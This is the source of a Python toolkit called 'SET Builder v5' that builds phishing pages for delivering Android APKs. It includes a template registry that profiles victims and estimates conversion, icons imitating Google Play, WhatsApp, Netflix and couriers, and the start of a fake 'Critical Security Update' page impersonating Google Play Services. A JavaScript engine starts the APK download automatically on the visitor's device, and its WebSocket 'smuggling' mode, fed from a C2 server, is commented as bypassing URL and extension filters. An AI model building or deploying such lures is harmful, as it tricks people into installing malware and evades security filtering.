#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║      SET Builder v5 - Multi-Template Social Engineering     ║
║      Sophisticated Encryption Toolkit (SET) v5.0            ║
║                                                              ║
║  12 social engineering templates for Android APK delivery   ║
║  with full HTML/CSS/JS, victim profiling, and C2 integration ║
╚══════════════════════════════════════════════════════════════╝
"""

import base64, json, os, sys, time, uuid, zlib, html, hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Callable, Any, Tuple

# ================================================================
# TEMPLATE REGISTRY & METADATA
# ================================================================

TEMPLATE_REGISTRY: Dict[str, Dict[str, Any]] = {}

def register_template(
    tid: str,
    name: str,
    category: str,
    description: str,
    victim_profile: str,
    psychology: str,
    delivery_method: str,
    difficulty: str,
    risk_detection: str,
    conversion_estimate: str,
    brand_colors: Dict[str, str],
    generator: Callable
):
    TEMPLATE_REGISTRY[tid] = {
        "id": tid,
        "name": name,
        "category": category,
        "description": description,
        "victim_profile": victim_profile,
        "psychology": psychology,
        "delivery_method": delivery_method,
        "difficulty": difficulty,
        "risk_detection": risk_detection,
        "conversion_estimate": conversion_estimate,
        "brand_colors": brand_colors,
        "generator": generator
    }

# ================================================================
# SHARED ASSETS
# ================================================================

def _inline_svg(icon_name: str) -> str:
    """Return inline SVG base64 data URI for common icons."""
    icons = {
        "shield": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>""",
        "download": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>""",
        "check": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>""",
        "warning": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>""",
        "lock": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>""",
        "phone": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>""",
        "update": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79 2.73 2.71 7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58 3.51-3.47 9.14-3.47 12.65 0L21 3v7.12zM12.5 8v4.25l3.5 2.08-.72 1.21L11 13V8h1.5z"/></svg>""",
        "whatsapp": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>""",
        "netflix": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#E50914"><path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24h-.297zm-5.398 0v24h4.398V0H0zm11.502 0v24h4.398V0h-4.398zm5.594 0v24h4.398V0h-4.398z"/></svg>""",
        "playstore": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#3DDC84"><path d="M3 20.5v-17c0-.59.34-1.11.84-1.35L13.69 12l-9.85 9.85c-.5-.24-.84-.76-.84-1.35zm13.81-5.38L6.05 21.34l8.49-8.49 2.27 2.27zm3.35-4.31c.34.27.59.69.59 1.19s-.25.92-.59 1.19l-2.42 1.42L15.55 12l2.17-2.17 2.44 1.38zM6.05 2.66l10.76 6.22-2.27 2.27-8.49-8.49z"/></svg>""",
        "bank": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zm-5-9L2 6v2h20V6z"/></svg>""",
        "package": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>""",
        "gamepad": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2zm4.5 2c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm4-3c-.83 0-1.5-.67-1.5-1.5S18.67 9 19.5 9s1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>""",
        "health": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 10h-4v4h-4v-4H6v-4h4V5h4v4h4v4z"/></svg>""",
        "heart": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#FF4081"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>""",
        "play": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>""",
        "scan": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5z"/></svg>""",
        "wifi": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>""",
        "download_cloud": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>""",
        "bell": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>""",
        "globe": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>""",
    }
    svg = icons.get(icon_name, icons["download"])
    b64 = base64.b64encode(svg.encode()).decode()
    return f"data:image/svg+xml;base64,{b64}"

def _icon_img(icon_name: str, size: int = 48, color: str = None) -> str:
    svg = f"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="{color or 'currentColor'}" width="{size}" height="{size}">"""
    icons_map = {
        "playstore": '<path d="M3 20.5v-17c0-.59.34-1.11.84-1.35L13.69 12l-9.85 9.85c-.5-.24-.84-.76-.84-1.35zm13.81-5.38L6.05 21.34l8.49-8.49 2.27 2.27zm3.35-4.31c.34.27.59.69.59 1.19s-.25.92-.59 1.19l-2.42 1.42L15.55 12l2.17-2.17 2.44 1.38zM6.05 2.66l10.76 6.22-2.27 2.27-8.49-8.49z"/>',
        "whatsapp": '<path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>',
        "netflix": '<path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24h-.297zm-5.398 0v24h4.398V0H0zm11.502 0v24h4.398V0h-4.398zm5.594 0v24h4.398V0h-4.398z"/>',
        "dhl": '<rect x="2" y="6" width="20" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><text x="12" y="16" font-family="Arial,sans-serif" font-size="8" font-weight="bold" text-anchor="middle" fill="currentColor">DHL</text>',
        "fedex": '<rect x="2" y="6" width="20" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><text x="12" y="16" font-family="Arial,sans-serif" font-size="7" font-weight="bold" text-anchor="middle" fill="currentColor">FedEx</text>',
        "amazon": '<path d="M13.2 12.6c-.4.3-1.5 1-3.2 1-2.4 0-4.3-1.5-4.3-4s1.9-4 4.3-4c2.8 0 4 1.8 4.2 2.4l-2.2.9c-.2-.5-.8-1.3-2-1.3-1.3 0-2.4 1.1-2.4 2.8s1.1 2.8 2.4 2.8c1 0 1.6-.4 1.9-.6l-1.1-.7 1.6-1.5 2.2 2 1.7 1.6-2.3 1.8-1.8-1.8zM22 8v8h-2V8h2zm-5 0v8h-2v-5.4l-3 5.4h-.2l-3-5.4V16h-2V8h2l3.2 5.8L16 8h2zM6 8H2v8h2v-3h2c1.7 0 3-1.3 3-3S7.7 8 6 8zm0 3H4v-1h2c.6 0 1 .4 1 1s-.4 1-1 1z"/>',
        "google": '<path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>',
        "android_update": '<path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 17H7V6h10v12z" fill="currentColor"/><circle cx="12" cy="21" r="1" fill="#3DDC84"/><path d="M10 9l2 2 2-2" fill="none" stroke="#3DDC84" stroke-width="2"/><path d="M12 11V5" fill="none" stroke="#3DDC84" stroke-width="2"/>',
        "android_bot": '<path d="M17.5 9.5a1 1 0 011 1v4a1 1 0 01-2 0v-4a1 1 0 011-1zm-11 0a1 1 0 00-1 1v4a1 1 0 002 0v-4a1 1 0 00-1-1zm2-4.5A2.5 2.5 0 016 2.5c0-.28.06-.54.15-.78L4.69.96A.5.5 0 015.31.28L6.9 1.64A2.48 2.48 0 019.5.5c.86 0 1.63.35 2.19.92l1.56-1.34a.5.5 0 11.62.68l-1.46 1.28c.1.24.15.5.15.78A2.5 2.5 0 0110 5H8a2.5 2.5 0 01-2.5-2.5zM11 3.5a.5.5 0 100-1 .5.5 0 000 1zM7 3.5a.5.5 0 100-1 .5.5 0 000 1z" fill="#3DDC84"/><path d="M6 7h12v6l-2 8H8l-2-8V7zm1 1v5.5L8.5 20h7L17 13.5V8H7z" fill="#3DDC84" opacity=".4"/><rect x="4" y="7" width="16" height="2" rx="1" fill="#3DDC84"/>',
        "bank_building": '<path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zm-5-9L2 6v2h20V6z" fill="currentColor"/>',
        "delivery_box": '<path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" fill="currentColor"/>',
        "game_controller": '<path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2zm4.5 2c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm4-3c-.83 0-1.5-.67-1.5-1.5S18.67 9 19.5 9s1.5.67 1.5 1.5-.67 1.5-1.5 1.5z" fill="currentColor"/>',
        "medical": '<path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 10h-4v4h-4v-4H6v-4h4V5h4v4h4v4z" fill="currentColor"/>',
        "movie": '<path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12z" fill="currentColor"/><path d="M8 8l5 4-5 4V8z" fill="#E50914"/>',
        "heart_icon": '<path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" fill="#FF4081"/>',
        "security_shield": '<path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#4CAF50"/>',
        "scan_icon": '<path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5z" fill="currentColor"/>',
    }
    p = icons_map.get(icon_name, icons_map["android_bot"])
    return svg + p + '</svg>'


def _b64_svg(icon_name: str, color: str = "currentColor", size: int = 48) -> str:
    svg_content = _icon_img(icon_name, size, color)
    return f"data:image/svg+xml;base64,{base64.b64encode(svg_content.encode()).decode()}"


def _download_js_template(
    apk_url: str,
    fake_app_name: str = "SecurityUpdate.apk",
    use_socketio: bool = False,
    c2_ws_url: str = None
) -> str:
    """
    JavaScript download engine with progressive enhancement:
    1. Try direct download via anchor click (works on most mobile browsers)
    2. Fallback to iframe download
    3. Fallback to meta refresh
    4. If c2_ws_url: use WebSocket chunked download (bypasses URL filters)
    """
    if use_socketio and c2_ws_url:
        # WebSocket smuggling - bypasses URL/extension filters
        return f"""
        <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
        <script>
        (function(){{
            var wsUrl = "{c2_ws_url}";
            var chunks = [];
            var socket;
            function connectWS(){{
                try {{
                    socket = io(wsUrl, {{ transports: ['websocket'], reconnection: false }});
                    socket.on('connect', function(){{
                        socket.emit('request_apk', {{ app: '{fake_app_name}' }});
                    }});
                    socket.on('chunk', function(c){{ chunks.push(c); }});
                    socket.on('downloadComplete', function(){{
                        var blob = new Blob(chunks, {{ type: 'application/vnd.android.package-archive' }});
                        var url = URL.createObjectURL(blob);
                        var a = document.createElement('a');
                        a.href = url; a.download = '{fake_app_name}'; a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        setTimeout(function(){{ URL.revokeObjectURL(url); }}, 5000);
                    }});
                    socket.on('downloadProgress', function(p){{ updateProgress(p); }});
                }} catch(e){{ directDownload(); }}
            }}
            function directDownload(){{
                var a = document.createElement('a');
                a.href = '{apk_url}'; a.download = '{fake_app_name}'; a.style.display = 'none';
                document.body.appendChild(a); a.click();
                setTimeout(function(){{
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '{apk_url}';
                    document.body.appendChild(iframe);
                }}, 1000);
            }}
            {{{{__START_DOWNLOAD_FN__}}}}
        }})();
        </script>
        """
    else:
        # Standard download with multiple fallback strategies
        return f"""
        <script>
        (function(){{
            var apkUrl = '{apk_url}';
            var fileName = '{fake_app_name}';
            var downloadAttempted = false;

            function triggerDownload(useIframe) {{
                if (downloadAttempted) return;
                downloadAttempted = true;

                if (useIframe) {{
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = apkUrl;
                    document.body.appendChild(iframe);
                    return;
                }}

                try {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', apkUrl, true);
                    xhr.responseType = 'blob';
                    xhr.onload = function() {{
                        if (xhr.status === 200) {{
                            var blob = xhr.response;
                            var url = URL.createObjectURL(blob);
                            var a = document.createElement('a');
                            a.href = url;
                            a.download = fileName;
                            a.style.display = 'none';
                            document.body.appendChild(a);
                            a.click();
                            setTimeout(function(){{ URL.revokeObjectURL(url); }}, 5000);
                        }} else {{
                            // Fallback to direct navigation
                            window.location.href = apkUrl;
                        }}
                    }};
                    xhr.onerror = function() {{
                        // Fallback
                        triggerDownload(true);
                    }};
                    xhr.send();
                }} catch(e) {{
                    triggerDownload(true);
                }}
            }}

            // Try multiple methods
            setTimeout(function(){{ triggerDownload(false); }}, 800);

            // Backup: direct window location
            setTimeout(function() {{
                if (!downloadAttempted) {{
                    window.location.href = apkUrl;
                }}
            }}, 3000);
        }})();
        </script>
        """


# ================================================================
# HELPER: Fake Loading/Scanning Animation CSS
# ================================================================

_ANIMATION_CSS = """
@keyframes scanPulse {
    0%, 100% { opacity: 0.6; transform: scale(1); }
    50% { opacity: 1; transform: scale(1.02); }
}
@keyframes progressFill {
    0% { width: 0%; }
    20% { width: 22%; }
    40% { width: 45%; }
    60% { width: 68%; }
    80% { width: 85%; }
    100% { width: 100%; }
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
@keyframes fadeSlideIn {
    0% { opacity: 0; transform: translateY(20px); }
    100% { opacity: 1; transform: translateY(0); }
}
@keyframes checkmark {
    0% { stroke-dashoffset: 50; }
    100% { stroke-dashoffset: 0; }
}
@keyframes pulseGlow {
    0%, 100% { box-shadow: 0 0 5px rgba(61,220,132,0.3); }
    50% { box-shadow: 0 0 20px rgba(61,220,132,0.6); }
}
@keyframes shimmer {
    0% { background-position: -200% 0; }
    100% { background-position: 200% 0; }
}
.scan-line {
    height: 3px;
    background: linear-gradient(90deg, transparent, #3DDC84, transparent);
    background-size: 200% 100%;
    animation: shimmer 1.5s infinite;
    width: 100%;
    margin: 4px 0;
}
.progress-bar-container {
    width: 100%;
    height: 6px;
    background: rgba(255,255,255,0.1);
    border-radius: 3px;
    overflow: hidden;
    margin: 16px 0;
}
.progress-bar-fill {
    height: 100%;
    border-radius: 3px;
    animation: progressFill 4s ease-in-out forwards;
}
.progress-bar-fill.green { background: linear-gradient(90deg, #4CAF50, #8BC34A); }
.progress-bar-fill.blue { background: linear-gradient(90deg, #2196F3, #03A9F4); }
.progress-bar-fill.red { background: linear-gradient(90deg, #F44336, #FF5722); }
.progress-bar-fill.orange { background: linear-gradient(90deg, #FF9800, #FFC107); }
"""

# ================================================================
# TEMPLATE 1: Google Play System Update
# ================================================================

def _template_google_play_update(apk_url: str, c2_url: str, config: dict) -> str:
    brand = {
        "name": "Google Play Services",
        "primary": "#3DDC84",
        "bg": "#FFFFFF",
        "text": "#1a1a1a",
        "accent": "#1a73e8",
        "icon": "playstore"
    }
    
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="{brand['bg']}">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>Google Play Services - Update Required</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Google Sans', 'Segoe UI', Roboto, sans-serif; }}
body {{ background: {brand['bg']}; color: {brand['text']}; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }}
.status-bar {{ width: 100%; height: 6px; background: linear-gradient(90deg, {brand['primary']}, #1a73e8); position: sticky; top: 0; z-index: 100; }}
.container {{ max-width: 420px; width: 100%; padding: 20px; }}
.header {{ display: flex; align-items: center; gap: 12px; padding: 16px 0; border-bottom: 1px solid #e0e0e0; margin-bottom: 24px; }}
.header img {{ width: 40px; height: 40px; }}
.header h1 {{ font-size: 18px; font-weight: 500; color: {brand['text']}; }}
.header .verified {{ font-size: 12px; color: #4CAF50; display: flex; align-items: center; gap: 4px; }}
.alert-card {{ background: #FFF8E1; border: 1px solid #FFE082; border-radius: 12px; padding: 20px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 12px; }}
.alert-card .icon {{ color: #FF9800; flex-shrink: 0; }}
.alert-card .text h3 {{ font-size: 14px; color: #E65100; margin-bottom: 4px; }}
.alert-card .text p {{ font-size: 13px; color: #795548; line-height: 1.5; }}
.update-card {{ background: white; border-radius: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 24px; margin-bottom: 16px; border: 1px solid #e0e0e0; }}
.update-info {{ display: flex; align-items: center; gap: 16px; margin-bottom: 20px; }}
.update-info .app-icon {{ width: 56px; height: 56px; border-radius: 12px; }}
.update-info .details h2 {{ font-size: 16px; font-weight: 600; }}
.update-info .details p {{ font-size: 13px; color: #666; }}
.update-info .details .version {{ font-size: 12px; color: #999; margin-top: 2px; }}
.changelog {{ background: #F5F5F5; border-radius: 8px; padding: 12px; margin-bottom: 16px; }}
.changelog h4 {{ font-size: 13px; color: #333; margin-bottom: 8px; }}
.changelog ul {{ list-style: none; padding: 0; }}
.changelog ul li {{ font-size: 12px; color: #555; padding: 3px 0; padding-left: 16px; position: relative; }}
.changelog ul li::before {{ content: "✓"; position: absolute; left: 0; color: {brand['primary']}; }}
.security-badge {{ display: flex; align-items: center; gap: 8px; padding: 10px 12px; background: #E8F5E9; border-radius: 8px; margin-bottom: 16px; }}
.security-badge span {{ font-size: 12px; color: #2E7D32; }}
.permissions {{ display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 16px; }}
.permissions .tag {{ background: #F5F5F5; padding: 4px 10px; border-radius: 12px; font-size: 11px; color: #666; }}
.download-section {{ text-align: center; padding: 16px 0; }}
.download-btn {{ display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px 24px; background: {brand['primary']}; color: white; border: none; border-radius: 28px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; box-shadow: 0 4px 12px rgba(61,220,132,0.3); }}
.download-btn:hover {{ transform: translateY(-1px); box-shadow: 0 6px 16px rgba(61,220,132,0.4); }}
.download-btn:active {{ transform: translateY(0); }}
.download-btn:disabled {{ opacity: 0.6; cursor: not-allowed; }}
.download-status {{ display: none; margin-top: 16px; padding: 12px; background: #F5F5F5; border-radius: 12px; }}
.download-status.active {{ display: block; }}
.status-text {{ font-size: 13px; color: #666; margin-bottom: 8px; }}
.footer {{ text-align: center; padding: 24px 0; font-size: 11px; color: #999; }}
.footer a {{ color: {brand['accent']}; text-decoration: none; }}
.hidden {{ display: none !important; }}
@keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(10px); }} to {{ opacity: 1; transform: translateY(0); }} }}
.animate-in {{ animation: fadeIn 0.5s ease-out; }}
</style>
</head>
<body>
<div class="status-bar"></div>
<div class="container">
    <div class="header">
        <img src="{_b64_svg('playstore', '#3DDC84', 40)}" alt="Google Play">
        <div>
            <h1>Google Play Services</h1>
            <div class="verified">✓ Verified by Google Play Protect</div>
        </div>
    </div>

    <div class="alert-card animate-in">
        <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#FF9800"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
        </div>
        <div class="text">
            <h3>Critical Security Update Required</h3>
            <p>Your Google Play Services version is out of date. This exposes your device to security vulnerabilities. Update now to stay protected.</p>
        </div>
    </div>

    <div class="update-card animate-in">
        <div class="update-info">
            <img class="app-icon" src="{_b64_svg('android_update', '#3DDC84', 56)}" alt="Update">
            <div class="details">
                <h2>Google Play Services</h2>
                <p>Security Update</p>
                <div class="version">Version 24.35.14 → 25.02.10</div>
            </div>
